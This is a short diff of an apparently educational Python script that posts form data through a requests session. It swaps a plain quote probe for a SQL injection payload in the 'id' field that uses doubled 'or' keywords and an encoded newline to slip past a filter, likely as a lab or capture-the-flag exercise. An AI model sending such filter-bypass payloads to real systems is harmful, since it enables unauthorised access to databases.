@@ -2,7 +2,7 @@
 '''
     :author mrli
     :date  
-    :funcname
+    :funcname 认真一点
 '''
 from prac3 import showresultofresponse
 
@@ -17,8 +17,10 @@ showresultofresponse(sess.headers,sess.cookies,response.content,response)
 headers = sess.headers
 cookies = sess.cookies
 data = {
-    'id':'1\'',
-    'submit':'submit\'',
+    # 'id':'1\'',
+    # 'submit':'submit\'',
+    'id':'1\'oorr%0a\'1',
+    'submit':'submit'
 }
 response = sess.post(url,data=data,headers=headers,cookies=cookies)
 showresultofresponse(sess.headers,sess.cookies,response.content,response)
